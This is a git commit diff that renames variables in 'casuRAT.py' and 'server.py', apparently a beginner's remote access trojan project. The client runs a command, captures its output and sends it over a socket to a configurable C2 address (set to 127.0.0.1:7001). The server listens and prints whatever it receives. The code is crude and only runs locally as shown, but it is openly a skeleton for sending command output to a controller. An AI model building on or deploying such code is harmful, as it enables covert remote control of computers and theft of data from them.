907e30399480e54fab84ad2a570d078b720afc07
Anthony Kelly <Anthony.James.k@gmail.com>
2021-02-28 11:05:35 -0500

    Make variables less THICC

--- casuRAT.py
+++ casuRAT.py
@@ -6,19 +6,19 @@ import subprocess
 import base64
 
 # Initialize remote host variables with user input
-#RHOST = str(input("C2 IP Address\n" ))
-RHOST = '127.0.0.1'
-#RPORT = int(input("C2 Port\n"))
-RPORT = 7001
-RSERVER = (RHOST, RPORT)
+#rhost = str(input("C2 IP Address\n" ))
+rhost = '127.0.0.1'
+#rport = int(input("C2 Port\n"))
+rport = 7001
+rserver = (rhost, rport)
 
 # Run command
-CMD = input("What is your command\n")
-CMDARG = str(CMD).split(" ")
-execute = subprocess.run(CMDARG, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-DATA = execute.stdout
+cmd = input("What is your command\n")
+cmdarg = str(cmd).split(" ")
+execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+data = execute.stdout
 
 # Connect out
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(RSERVER)
-s.sendall(bytes(DATA, "utf-8"))
+s.connect(rserver)
+s.sendall(bytes(execute.stdout, "utf-8"))
--- server.py
+++ server.py
@@ -4,21 +4,21 @@
 import socket
 
 # Initialize socket bind variables with user input.
-# LHOST = str(input("Local bind address\n"))
-LHOST = '127.0.0.1'
-# LPORT = int(input("Local bind port\n"))
-LPORT = 7001
-LSERVER = (LHOST, LPORT)
+# lhost = str(input("Local bind address\n"))
+lhost = '127.0.0.1'
+# lport = int(input("Local bind port\n"))
+lport = 7001
+lserver = (lhost, lport)
 
 # Create a socket that accepts connections, prints who connected, and recieves a message.
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.bind((LHOST, LPORT))
+    s.bind((lhost, lport))
     s.listen()
     conn, addr = s.accept()
     with conn:
         print('connected by', addr)
         while True:
-            DATA = conn.recv(1024).decode()
-            if not DATA:
+            data = conn.recv(1024).decode()
+            if not data:
                 break
-            print(DATA)
+            print(data)
